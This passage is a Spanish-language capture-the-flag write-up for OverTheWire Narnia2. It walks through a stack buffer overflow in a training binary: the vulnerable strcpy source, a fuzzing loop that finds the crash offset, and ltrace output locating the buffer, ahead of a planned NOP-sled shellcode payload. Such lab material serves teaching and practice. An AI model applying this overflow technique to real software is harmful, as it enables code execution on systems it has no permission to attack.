---
layout: default
---

## OverTheWire: Narnia2

En este desafío entraremos en un binxp "real" con un payload extremadamente basico que llena ESP con NOPS(\x90), excepto por un shellcode al final, y luego sobrescribiendo la dirección ret para que sea el inicio de ESP.

### Empezando

Lo primero que haremos como siempre es conectarnos a la máquina por SSH con las credenciales del desafío anterior:

`ssh narnia2@narnia.labs.overthewire.org -p 2226`

Aquí está el código fuente del binario:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128]; /*Declares the buffer length to be 128 bytes*/

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]); /*Display usage*/
        exit(1);
    }
    strcpy(buf,argv[1]); /*Copy contents of arg 1 to buffer*/
    printf("%s", buf); /*Print the buffer*/

    return 0;
}
```

Entonces, podemos comenzar obteniendo el offset de falla (que será alrededor de 128, ya que este es el tamaño del buffer, aunque si hay algo entre el final del buffer y el inicio de la dirección ret en la pila, entonces necesitaremos para jugar con la ubicación de la dirección ret en el payload), para esto hice un bucle de bash realmente simple que aumenta lentamente el relleno.

```bash
for i in $(seq 1 300); do echo $i; ./narnia2 $(python -c 'print "A"*'$i';'); done
```

Todo lo que hace son bucles de 1 a 300 y repite el número cada vez, pero también imprime "A" esa cantidad de veces mientras la pasa como argumento al binario, de modo que podamos seguir los números hasta encontrar Segmentation fault.

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA132
Segmentation fault
```

Podemos ver que después de 132 ocurre el segfault, ese es nuestro espacio que tenemos hasta que la dirección ret comienza a sobrescribirse.

Ahora, el buffer es de 128 bytes y la dirección ret se rompe en 132, por lo que entre el final del buffer y el inicio de la dirección de retorno hay 4 bytes de "basura", que puede llenar con nopsleds, pero en nuestro caso, repetiremos la dirección ret 4 veces (una caerá en la posición correcta, las otras son rellenos).

Entonces tenemos nuestro relleno, para obtener nuestra dirección de retorno, simplemente podemos bloquearlo con un segfault, mientras lo vemos con ltrace.

```bash
narnia2@narnia:/narnia$ ltrace ./narnia2 $(python -c 'print "A"*132')
__libc_start_main(0x804844b, 2, 0xffffd704, 0x80484a0 <unfinished ...>
strcpy(0xffffd5e8, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                                     = 0xffffd5e8
printf("%s", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                                           = 132
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```
